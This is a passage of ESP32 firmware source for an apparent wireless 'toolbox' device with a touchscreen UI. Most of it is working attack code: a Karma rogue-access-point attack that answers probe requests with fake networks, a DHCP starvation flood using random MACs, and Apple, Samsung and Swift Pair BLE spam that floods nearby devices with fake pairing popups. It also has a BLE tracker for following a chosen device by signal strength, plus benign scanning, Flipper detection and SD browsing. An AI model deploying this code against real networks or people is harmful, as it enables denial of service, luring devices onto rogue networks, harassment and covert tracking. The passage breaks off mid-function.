    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  KARMA — respond to probe requests with matching fake APs
// =============================================================================
static const int MAX_KARMA_SSIDS = 20;
static char s_karmaSSIDs[MAX_KARMA_SSIDS][33];
static int s_karmaCount = 0;
static uint32_t s_karmaBeacons = 0;
static bool s_karmaActive = false;
static uint32_t s_karmaLastBeacon = 0;

static void IRAM_ATTR karmaSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || !s_karmaActive) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 28 || (frame[0] & 0xFC) != 0x40) return;  // not a probe request

    const uint8_t* tags = frame + 24;
    int tagLen = len - 24;
    char ssid[33] = {0};
    for (int i = 0; i < tagLen - 1;) {
        if (tags[i] == 0 && tags[i+1] > 0 && tags[i+1] <= 32) {
            memcpy(ssid, tags + i + 2, tags[i+1]);
            ssid[tags[i+1]] = 0;
            break;
        }
        i += 2 + tags[i+1];
    }
    if (ssid[0] == 0) return;

    // Check if already captured
    for (int i = 0; i < s_karmaCount; i++) {
        if (strcmp(s_karmaSSIDs[i], ssid) == 0) return;
    }
    if (s_karmaCount < MAX_KARMA_SSIDS) {
        strncpy(s_karmaSSIDs[s_karmaCount], ssid, 32);
        s_karmaCount++;
        Serial.printf("[karma] captured SSID: %s\n", ssid);
    }
}

static void karmaStart() {
    s_karmaCount = 0;
    s_karmaBeacons = 0;
    s_karmaActive = true;
    s_karmaLastBeacon = 0;
    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("KarmaAP", NULL, 1, 1);  // hidden AP
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(karmaSniffCb);
    Serial.println("[toolbox] Karma started");
}

static void karmaStop() {
    s_karmaActive = false;
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
}

static void karmaTick() {
    uint32_t now = millis();
    if (now - s_karmaLastBeacon < 20 || s_karmaCount == 0) return;
    s_karmaLastBeacon = now;

    // Broadcast beacons for all captured SSIDs
    int idx = s_karmaBeacons % s_karmaCount;
    const char* ssid = s_karmaSSIDs[idx];
    size_t ssidLen = strlen(ssid);

    beaconFrame[10] = 0xCA; beaconFrame[11] = 0xFE;
    beaconFrame[12] = 0xBA; beaconFrame[13] = 0xBE;
    beaconFrame[14] = (uint8_t)idx; beaconFrame[15] = (uint8_t)(idx ^ 0xCC);
    memcpy(beaconFrame + 16, beaconFrame + 10, 6);
    beaconFrame[36] = 0x00;
    beaconFrame[37] = (uint8_t)ssidLen;
    memcpy(beaconFrame + 38, ssid, ssidLen);
    size_t ratesOff = 38 + ssidLen;
    beaconFrame[ratesOff] = 0x01; beaconFrame[ratesOff + 1] = 0x08;
    uint8_t rates[] = { 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
    memcpy(beaconFrame + ratesOff + 2, rates, 8);
    size_t chanOff = ratesOff + 10;
    beaconFrame[chanOff] = 0x03; beaconFrame[chanOff + 1] = 0x01; beaconFrame[chanOff + 2] = 0x01;
    esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, chanOff + 3, false);
    s_karmaBeacons++;
}

static void drawKarma(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();
    karmaTick();

    t.setTextColor(Theme::RED, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("KARMA ATTACK", w / 2, HEADER_H + 20, 4);

    char buf[48];
    snprintf(buf, sizeof buf, "Captured %d SSIDs  |  %lu beacons",
             s_karmaCount, (unsigned long)s_karmaBeacons);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString(buf, w / 2, HEADER_H + 50, 2);

    // List captured SSIDs
    t.setTextDatum(TL_DATUM);
    int listY = HEADER_H + 75;
    for (int i = 0; i < min(s_karmaCount, 8); i++) {
        int drawIdx = i - s_toolScroll;
        if (drawIdx < 0 || drawIdx >= 8) continue;
        bool active = ((int)(s_karmaBeacons % s_karmaCount) == i);
        t.setTextColor(active ? Theme::VAPOR_YELLOW : Theme::CYAN, Theme::BG);
        t.drawString(s_karmaSSIDs[i], 12, listY + drawIdx * 20, 2);
    }

    t.setTextColor(Theme::GREEN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("Devices will auto-connect", w / 2, h - 55, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  DHCP STARVE — flood DHCP discover to exhaust address pool
// =============================================================================
static uint32_t s_dhcpSent = 0;
static uint32_t s_dhcpLastMs = 0;

// DHCP Discover packet template (UDP, broadcast)
static void dhcpStarveStart() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    s_dhcpSent = 0;
    s_dhcpLastMs = 0;
    Serial.println("[toolbox] DHCP starve started");
}

static void dhcpStarveTick() {
    uint32_t now = millis();
    if (now - s_dhcpLastMs < 10) return;
    s_dhcpLastMs = now;

    // Send DHCP discover as raw UDP broadcast on port 67
    // We use WiFi.begin() with random MACs to generate real DHCP discovers
    uint8_t mac[6];
    mac[0] = 0xDE; mac[1] = random(0, 256); mac[2] = random(0, 256);
    mac[3] = random(0, 256); mac[4] = random(0, 256); mac[5] = random(0, 256);
    mac[0] &= 0xFE;  // unicast
    mac[0] |= 0x02;  // locally administered
    esp_wifi_set_mac(WIFI_IF_STA, mac);
    WiFi.begin("DHCP_STARVE_TARGET");  // will fail but sends DHCP discover
    delay(2);
    WiFi.disconnect();
    s_dhcpSent++;
}

static void drawDhcpStarve(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();
    dhcpStarveTick();

    t.setTextColor(Theme::RED, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("DHCP STARVE", w / 2, HEADER_H + 20, 4);

    t.setTextColor(Theme::CYAN, Theme::BG);
    t.drawString("Flooding DHCP requests", w / 2, HEADER_H + 55, 2);
    t.drawString("with random MACs", w / 2, HEADER_H + 75, 2);

    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_dhcpSent);
    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.drawString(buf, w / 2, h / 2 + 10, 7);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("requests sent", w / 2, h / 2 + 50, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  BLE SCAN
// =============================================================================
static const int MAX_BLE_RESULTS = 40;
struct BleResult {
    char name[25];
    char addr[18];
    int rssi;
    uint16_t appearance;
};
static BleResult s_bleResults[MAX_BLE_RESULTS];
static int s_bleCount = 0;
static bool s_bleScanning = false;
static NimBLEScan* s_pBLEScan = nullptr;

class ToolboxBleCallbacks : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        if (s_bleCount >= MAX_BLE_RESULTS) return;
        BleResult& r = s_bleResults[s_bleCount];
        const char* n = dev->getName().c_str();
        if (n && n[0]) strncpy(r.name, n, 24);
        else strcpy(r.name, "<unknown>");
        r.name[24] = 0;
        snprintf(r.addr, sizeof r.addr, "%s", dev->getAddress().toString().c_str());
        r.rssi = dev->getRSSI();
        r.appearance = dev->getAppearance();
        s_bleCount++;
    }
};
static ToolboxBleCallbacks s_bleCallbacks;

static void bleScanStart() {
    s_bleCount = 0;
    s_bleScanning = true;
    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    s_pBLEScan = NimBLEDevice::getScan();
    s_pBLEScan->setScanCallbacks(&s_bleCallbacks, false);
    s_pBLEScan->setActiveScan(true);
    s_pBLEScan->setInterval(100);
    s_pBLEScan->setWindow(99);
    s_pBLEScan->start(10, false);  // 10 seconds
    Serial.println("[toolbox] BLE scan started");
}

static void bleScanUpdate() {
    if (s_pBLEScan && !s_pBLEScan->isScanning()) {
        s_bleScanning = false;
    }
}

static void drawBleScan(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    if (s_bleScanning) bleScanUpdate();

    int statusY = HEADER_H + 2;
    t.setTextColor(Theme::VAPOR_YELLOW, Theme::BG);
    t.setTextDatum(TL_DATUM);
    char buf[48];
    if (s_bleScanning) snprintf(buf, sizeof buf, "BLE scanning... (%d found)", s_bleCount);
    else snprintf(buf, sizeof buf, "Found %d  [TAP HERE=rescan]", s_bleCount);
    t.drawString(buf, 8, statusY, 2);

    int listTop = statusY + 20;
    int visibleRows = (h - listTop - 30) / (RESULT_H + RESULT_PAD);

    for (int i = 0; i < s_bleCount; i++) {
        int drawIdx = i - s_toolScroll;
        if (drawIdx < 0 || drawIdx >= visibleRows) continue;
        int y = listTop + drawIdx * (RESULT_H + RESULT_PAD);
        const BleResult& r = s_bleResults[i];

        t.fillRect(4, y, w - 8, RESULT_H, Theme::TASKBAR);

        // Name
        t.setTextColor(Theme::CYAN, Theme::TASKBAR);
        t.setTextDatum(ML_DATUM);
        t.drawString(r.name, 8, y + RESULT_H / 2, 2);

        // RSSI bar
        drawRssiBar(t, w - 120, y + 4, 35, RESULT_H - 8, r.rssi);

        // RSSI number
        t.setTextColor(Theme::VAPOR_PINK, Theme::TASKBAR);
        t.setTextDatum(MR_DATUM);
        snprintf(buf, sizeof buf, "%d", r.rssi);
        t.drawString(buf, w - 125, y + RESULT_H / 2, 1);

        // Address
        t.setTextColor(Theme::AMBER, Theme::TASKBAR);
        t.setTextDatum(MR_DATUM);
        t.drawString(r.addr, w - 10, y + RESULT_H / 2, 1);
    }

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  APPLE BLE SPAM — fake proximity pairing popups on iPhones
// =============================================================================
static NimBLEAdvertising* s_pAdv = nullptr;
static uint32_t s_appleSpamCount = 0;
static uint32_t s_appleSpamLastMs = 0;
static int s_appleDevIdx = 0;

// Apple proximity pairing device types (manufacturer data prefix after 0x4C 0x00)
// Format: length, type 0x07 (proximity pair), device model bytes
static const uint8_t APPLE_DEVICES[][4] = {
    {0x07, 0x19, 0x07, 0x14},  // AirPods Pro
    {0x07, 0x19, 0x07, 0x02},  // AirPods
    {0x07, 0x19, 0x07, 0x0E},  // AirPods Pro 2
    {0x07, 0x19, 0x07, 0x0A},  // AirPods Max
    {0x07, 0x19, 0x07, 0x06},  // Beats Solo Pro
    {0x07, 0x19, 0x07, 0x10},  // Beats Fit Pro
    {0x07, 0x19, 0x07, 0x05},  // Beats X
    {0x07, 0x19, 0x07, 0x03},  // Powerbeats 3
};
static const char* APPLE_NAMES[] = {
    "AirPods Pro", "AirPods", "AirPods Pro 2", "AirPods Max",
    "Beats Solo Pro", "Beats Fit Pro", "Beats X", "Powerbeats 3"
};
static const int APPLE_DEV_COUNT = 8;

static void appleSpamStart() {
    s_appleSpamCount = 0;
    s_appleSpamLastMs = 0;
    s_appleDevIdx = 0;
    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    s_pAdv = NimBLEDevice::getAdvertising();
    Serial.println("[toolbox] Apple BLE spam started");
}

static void appleSpamTick() {
    uint32_t now = millis();
    if (now - s_appleSpamLastMs < 100) return;  // switch device every 100ms
    s_appleSpamLastMs = now;

    s_pAdv->stop();

    // Build Apple manufacturer data
    // Company ID 0x004C (Apple) + proximity pairing data
    uint8_t mfgData[16];
    mfgData[0] = 0x4C; mfgData[1] = 0x00;  // Apple company ID (little-endian)
    // Copy device type bytes
    memcpy(mfgData + 2, APPLE_DEVICES[s_appleDevIdx], 4);
    // Random status bytes
    mfgData[6] = random(0, 256);
    mfgData[7] = random(0, 256);
    mfgData[8] = 0x00;

    NimBLEAdvertisementData advData;
    advData.setFlags(0x06);  // general discoverable + BR/EDR not supported
    advData.setManufacturerData(std::string((char*)mfgData, 9));

    s_pAdv->setAdvertisementData(advData);
    s_pAdv->start();

    s_appleDevIdx = (s_appleDevIdx + 1) % APPLE_DEV_COUNT;
    s_appleSpamCount++;
}

static void drawAppleSpam(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    appleSpamTick();

    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("APPLE BLE SPAM", w / 2, HEADER_H + 20, 4);

    // Show cycling device names
    t.setTextDatum(TL_DATUM);
    int listY = HEADER_H + 50;
    for (int i = 0; i < APPLE_DEV_COUNT; i++) {
        uint16_t col = (i == s_appleDevIdx) ? Theme::VAPOR_YELLOW : Theme::CYAN;
        t.setTextColor(col, Theme::BG);
        t.drawString(APPLE_NAMES[i], 12, listY + i * 20, 2);
    }

    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_appleSpamCount);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString(buf, w / 2, h - 65, 6);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("popups sent", w / 2, h - 35, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  SAMSUNG BLE SPAM — fake Galaxy Buds pairing on Samsung phones
// =============================================================================
static uint32_t s_samsungSpamCount = 0;
static uint32_t s_samsungSpamLastMs = 0;
static int s_samsungDevIdx = 0;

// Samsung uses a custom BLE service UUID for buds pairing
// FD5A is Samsung's registered 16-bit UUID
static const uint8_t SAMSUNG_DEVICES[][2] = {
    {0x01, 0xEE},  // Galaxy Buds Pro
    {0x01, 0xEF},  // Galaxy Buds Live
    {0x02, 0x00},  // Galaxy Buds2
    {0x02, 0x01},  // Galaxy Buds2 Pro
    {0x02, 0x02},  // Galaxy Buds FE
    {0x01, 0xF0},  // Galaxy Buds+
};
static const char* SAMSUNG_NAMES[] = {
    "Galaxy Buds Pro", "Galaxy Buds Live", "Galaxy Buds2",
    "Galaxy Buds2 Pro", "Galaxy Buds FE", "Galaxy Buds+"
};
static const int SAMSUNG_DEV_COUNT = 6;

static void samsungSpamStart() {
    s_samsungSpamCount = 0;
    s_samsungSpamLastMs = 0;
    s_samsungDevIdx = 0;
    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    s_pAdv = NimBLEDevice::getAdvertising();
    Serial.println("[toolbox] Samsung BLE spam started");
}

static void samsungSpamTick() {
    uint32_t now = millis();
    if (now - s_samsungSpamLastMs < 100) return;
    s_samsungSpamLastMs = now;

    s_pAdv->stop();

    // Samsung manufacturer data: company ID 0x0075 (Samsung)
    uint8_t mfgData[12];
    mfgData[0] = 0x75; mfgData[1] = 0x00;  // Samsung company ID
    mfgData[2] = 0x42;  // type
    mfgData[3] = SAMSUNG_DEVICES[s_samsungDevIdx][0];
    mfgData[4] = SAMSUNG_DEVICES[s_samsungDevIdx][1];
    mfgData[5] = random(0, 256);
    mfgData[6] = random(0, 256);
    mfgData[7] = random(0, 256);

    NimBLEAdvertisementData advData;
    advData.setFlags(0x06);
    advData.setManufacturerData(std::string((char*)mfgData, 8));
    // Also add the Samsung FD5A service UUID
    advData.setCompleteServices16({NimBLEUUID((uint16_t)0xFD5A)});

    s_pAdv->setAdvertisementData(advData);
    s_pAdv->start();

    s_samsungDevIdx = (s_samsungDevIdx + 1) % SAMSUNG_DEV_COUNT;
    s_samsungSpamCount++;
}

static void drawSamsungSpam(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    samsungSpamTick();

    t.setTextColor(Theme::CYAN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("SAMSUNG BLE SPAM", w / 2, HEADER_H + 20, 4);

    t.setTextDatum(TL_DATUM);
    int listY = HEADER_H + 50;
    for (int i = 0; i < SAMSUNG_DEV_COUNT; i++) {
        uint16_t col = (i == s_samsungDevIdx) ? Theme::VAPOR_YELLOW : Theme::VAPOR_PURPLE;
        t.setTextColor(col, Theme::BG);
        t.drawString(SAMSUNG_NAMES[i], 12, listY + i * 22, 2);
    }

    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_samsungSpamCount);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString(buf, w / 2, h - 65, 6);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("popups sent", w / 2, h - 35, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  SWIFTPAIR SPAM — Windows Bluetooth pairing popups
// =============================================================================
static uint32_t s_swiftSpamCount = 0;
static uint32_t s_swiftSpamLastMs = 0;

static const char* SWIFT_NAMES[] = {
    "Wireless Mouse", "BT Keyboard", "Xbox Controller",
    "Surface Earbuds", "BT Speaker", "Wireless Headset"
};
static const int SWIFT_DEV_COUNT = 6;
static int s_swiftDevIdx = 0;

static void swiftPairStart() {
    s_swiftSpamCount = 0;
    s_swiftSpamLastMs = 0;
    s_swiftDevIdx = 0;
    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
    s_pAdv = NimBLEDevice::getAdvertising();
    Serial.println("[toolbox] SwiftPair spam started");
}

static void swiftPairTick() {
    uint32_t now = millis();
    if (now - s_swiftSpamLastMs < 100) return;
    s_swiftSpamLastMs = now;

    s_pAdv->stop();

    // Microsoft Swift Pair: company ID 0x0006 (Microsoft)
    // Beacon type 0x03 = Swift Pair
    uint8_t mfgData[8];
    mfgData[0] = 0x06; mfgData[1] = 0x00;  // Microsoft company ID
    mfgData[2] = 0x03;  // Swift Pair beacon type
    mfgData[3] = 0x00;  // scenario
    mfgData[4] = random(0, 256);  // RSSI byte
    mfgData[5] = random(0, 256);

    NimBLEAdvertisementData advData;
    advData.setFlags(0x06);
    advData.setManufacturerData(std::string((char*)mfgData, 6));
    advData.setName(SWIFT_NAMES[s_swiftDevIdx]);

    s_pAdv->setAdvertisementData(advData);
    s_pAdv->start();

    s_swiftDevIdx = (s_swiftDevIdx + 1) % SWIFT_DEV_COUNT;
    s_swiftSpamCount++;
}

static void drawSwiftPairSpam(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    swiftPairTick();

    t.setTextColor(Theme::VAPOR_BLUE, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("SWIFTPAIR SPAM", w / 2, HEADER_H + 20, 4);

    t.setTextDatum(TL_DATUM);
    int listY = HEADER_H + 50;
    for (int i = 0; i < SWIFT_DEV_COUNT; i++) {
        uint16_t col = (i == s_swiftDevIdx) ? Theme::VAPOR_YELLOW : Theme::CYAN;
        t.setTextColor(col, Theme::BG);
        t.drawString(SWIFT_NAMES[i], 12, listY + i * 22, 2);
    }

    char buf[32];
    snprintf(buf, sizeof buf, "%lu", (unsigned long)s_swiftSpamCount);
    t.setTextColor(Theme::GREEN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString(buf, w / 2, h - 65, 6);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("popups sent", w / 2, h - 35, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  BLE TRACK — live RSSI signal strength for a targeted device
// =============================================================================
static char s_trackAddr[18] = {0};
static char s_trackName[25] = {0};
static int  s_trackRssi = -100;
static int  s_trackRssiMin = 0;
static int  s_trackRssiMax = -100;
static uint32_t s_trackLastSeen = 0;
static bool s_trackFound = false;
static NimBLEScan* s_pTrackScan = nullptr;

class TrackBleCallbacks : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        if (strcmp(dev->getAddress().toString().c_str(), s_trackAddr) == 0) {
            s_trackRssi = dev->getRSSI();
            s_trackLastSeen = millis();
            s_trackFound = true;
            if (s_trackRssi < s_trackRssiMin) s_trackRssiMin = s_trackRssi;
            if (s_trackRssi > s_trackRssiMax) s_trackRssiMax = s_trackRssi;
        }
    }
};
static TrackBleCallbacks s_trackCallbacks;

static void bleTrackStart(int bleIdx) {
    if (bleIdx < 0 || bleIdx >= s_bleCount) return;
    strncpy(s_trackAddr, s_bleResults[bleIdx].addr, 17);
    s_trackAddr[17] = 0;
    strncpy(s_trackName, s_bleResults[bleIdx].name, 24);
    s_trackName[24] = 0;
    s_trackRssi = s_bleResults[bleIdx].rssi;
    s_trackRssiMin = 0;
    s_trackRssiMax = -100;
    s_trackLastSeen = millis();
    s_trackFound = false;

    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    s_pTrackScan = NimBLEDevice::getScan();
    s_pTrackScan->setScanCallbacks(&s_trackCallbacks, false);
    s_pTrackScan->setActiveScan(false);
    s_pTrackScan->setInterval(50);
    s_pTrackScan->setWindow(49);
    s_pTrackScan->start(0, false);  // continuous scan
    Serial.printf("[toolbox] BLE track started: %s %s\n", s_trackName, s_trackAddr);
}

static void drawBleTrack(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    t.setTextColor(Theme::CYAN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString(s_trackName, w / 2, HEADER_H + 15, 2);
    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.drawString(s_trackAddr, w / 2, HEADER_H + 35, 2);

    bool lost = (now - s_trackLastSeen) > 5000;
    if (lost) {
        t.setTextColor(Theme::RED, Theme::BG);
        t.drawString("SIGNAL LOST", w / 2, HEADER_H + 55, 2);
    }

    char buf[16];
    snprintf(buf, sizeof buf, "%d", s_trackRssi);
    t.setTextColor(lost ? Theme::RED : Theme::GREEN, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString(buf, w / 2, h / 2 - 10, 7);
    t.setTextColor(Theme::AMBER, Theme::BG);
    t.drawString("dBm", w / 2, h / 2 + 30, 2);

    int barY = h / 2 + 50;
    int barH = 20;
    float pct = constrain((s_trackRssi + 90.0f) / 60.0f, 0.0f, 1.0f);
    int barW = (int)((w - 20) * pct);
    uint16_t barCol = pct > 0.6f ? Theme::GREEN : pct > 0.3f ? Theme::AMBER : Theme::RED;
    t.fillRect(10, barY, w - 20, barH, Theme::TASKBAR);
    if (barW > 0) t.fillRect(10, barY, barW, barH, barCol);

    t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
    t.setTextDatum(TL_DATUM);
    snprintf(buf, sizeof buf, "MIN: %d", s_trackRssiMin);
    t.drawString(buf, 10, barY + barH + 8, 2);
    t.setTextDatum(TR_DATUM);
    snprintf(buf, sizeof buf, "MAX: %d", s_trackRssiMax);
    t.drawString(buf, w - 10, barY + barH + 8, 2);

    t.setTextDatum(MC_DATUM);
    const char* prox;
    if (s_trackRssi > -40) prox = "VERY CLOSE (< 1m)";
    else if (s_trackRssi > -55) prox = "CLOSE (1-3m)";
    else if (s_trackRssi > -70) prox = "NEARBY (3-8m)";
    else if (s_trackRssi > -85) prox = "FAR (8-15m)";
    else prox = "VERY FAR (> 15m)";
    t.setTextColor(barCol, Theme::BG);
    t.drawString(prox, w / 2, barY + barH + 30, 2);

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  FLIPPER DETECT — scan for Flipper Zero devices via BLE
// =============================================================================
static int s_flipperCount = 0;
static bool s_flipperScanning = false;
struct FlipperResult {
    char addr[18];
    int rssi;
    char name[25];
};
static const int MAX_FLIPPERS = 10;
static FlipperResult s_flippers[MAX_FLIPPERS];

// Flipper Zero uses MAC prefix 80:E1:26 (Flipper Devices Inc)
static bool isFlipperMac(const char* addr) {
    return (strncmp(addr, "80:e1:26", 8) == 0 || strncmp(addr, "80:E1:26", 8) == 0);
}

class FlipperBleCallbacks : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        const char* addr = dev->getAddress().toString().c_str();
        const char* name = dev->getName().c_str();
        bool isFlipper = isFlipperMac(addr);
        // Also check for "Flipper" in the device name
        if (!isFlipper && name && strstr(name, "Flipper")) isFlipper = true;
        if (!isFlipper) return;
        // Check for duplicate
        for (int i = 0; i < s_flipperCount; i++) {
            if (strcmp(s_flippers[i].addr, addr) == 0) {
                s_flippers[i].rssi = dev->getRSSI();
                return;
            }
        }
        if (s_flipperCount >= MAX_FLIPPERS) return;
        FlipperResult& r = s_flippers[s_flipperCount];
        strncpy(r.addr, addr, 17); r.addr[17] = 0;
        r.rssi = dev->getRSSI();
        if (name && name[0]) strncpy(r.name, name, 24);
        else strcpy(r.name, "Flipper Zero");
        r.name[24] = 0;
        s_flipperCount++;
        Serial.printf("[toolbox] Flipper found: %s %s %ddBm\n", r.name, r.addr, r.rssi);
    }
};
static FlipperBleCallbacks s_flipperCb;

static void flipperDetectStart() {
    s_flipperCount = 0;
    s_flipperScanning = true;
    if (!NimBLEDevice::isInitialized()) NimBLEDevice::init("");
    NimBLEScan* scan = NimBLEDevice::getScan();
    scan->setScanCallbacks(&s_flipperCb, false);
    scan->setActiveScan(true);
    scan->setInterval(100);
    scan->setWindow(99);
    scan->start(15, false);  // 15 second scan
    Serial.println("[toolbox] Flipper detect started");
}

static void drawFlipperDetect(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    NimBLEScan* scan = NimBLEDevice::getScan();
    if (scan && !scan->isScanning()) s_flipperScanning = false;

    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
    t.setTextDatum(MC_DATUM);
    t.drawString("FLIPPER DETECT", w / 2, HEADER_H + 20, 4);

    char buf[48];
    t.setTextColor(Theme::AMBER, Theme::BG);
    if (s_flipperScanning) snprintf(buf, sizeof buf, "Scanning... (%d found)", s_flipperCount);
    else snprintf(buf, sizeof buf, "Done. %d Flipper(s) found.", s_flipperCount);
    t.drawString(buf, w / 2, HEADER_H + 50, 2);

    if (s_flipperCount == 0 && !s_flipperScanning) {
        t.setTextColor(Theme::GREEN, Theme::BG);
        t.drawString("No Flippers detected", w / 2, h / 2, 4);
    }

    int listY = HEADER_H + 80;
    for (int i = 0; i < s_flipperCount; i++) {
        t.fillRect(4, listY + i * 35, w - 8, 30, Theme::TASKBAR);
        t.setTextColor(Theme::RED, Theme::TASKBAR);
        t.setTextDatum(ML_DATUM);
        t.drawString(s_flippers[i].name, 10, listY + i * 35 + 15, 2);
        t.setTextColor(Theme::CYAN, Theme::TASKBAR);
        t.setTextDatum(MR_DATUM);
        snprintf(buf, sizeof buf, "%s  %ddBm", s_flippers[i].addr, s_flippers[i].rssi);
        t.drawString(buf, w - 10, listY + i * 35 + 15, 1);
    }

    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
    t.setTextDatum(MC_DATUM);
    t.drawString(s_flipperScanning ? "SCANNING..." : "TAP TO STOP", w / 2, h - 12, 2);
}

// =============================================================================
//  SD BROWSER — browse files on the SD card
// =============================================================================
#include <FS.h>
#include <SD_MMC.h>
static String s_sdPath = "/";
static String s_sdFiles[30];
static int s_sdFileCount = 0;
static int s_sdSelected = -1;

static void sdBrowseDir(const String& path) {
    s_sdPath = path;
    s_sdFileCount = 0;
    s_sdSelected = -1;
    SD_MMC.setPins(5, 4, 6, 7, 2, 3);
    if (!SD_MMC.begin("/sd", false, false)) {
        Serial.println("[toolbox] SD mount failed");
        return;
    }
    fs::File dir = SD_MMC.open(path);
    if (!dir || !dir.isDirectory()) { dir.close(); return; }
    fs::File entry;
    while ((entry = dir.openNextFile()) && s_sdFileCount < 30) {
        String name = entry.name();
        if (entry.isDirectory()) name += "/";
        s_sdFiles[s_sdFileCount++] = name;
        entry.close();
    }
    dir.close();
    Serial.printf("[toolbox] SD browse: %s (%d entries)\n", path.c_str(), s_sdFileCount);
}

static void sdBrowserStart() {
    sdBrowseDir("/");
}

static void drawSdBrowser(TFT_eSPI& t, uint32_t now) {
    const int w = t.width();
    const int h = t.height();

    t.setTextColor(Theme::VAPOR_YELLOW, Theme::BG);
    t.setTextDatum(TL_DATUM);
    char buf[48];
    snprintf(buf, sizeof buf, "SD: %s  (%d items)", s_sdPath.c_str(), s_sdFileCount);
    t.drawString(buf, 8, HEADER_H + 4, 2);

    int listTop = HEADER_H + 24;
    int rowH = 22;
    int visible = (h - listTop - 30) / rowH;

    for (int i = 0; i < s_sdFileCount; i++) {
        int drawIdx = i - s_toolScroll;
        if (drawIdx < 0 || drawIdx >= visible) continue;
        int y = listTop + drawIdx * rowH;
        bool isDir = s_sdFiles[i].endsWith("/");
        bool sel = (i == s_sdSelected);

        t.fillRect(4, y, w - 8, rowH - 2, sel ? Theme::PURPLE : Theme::TASKBAR);
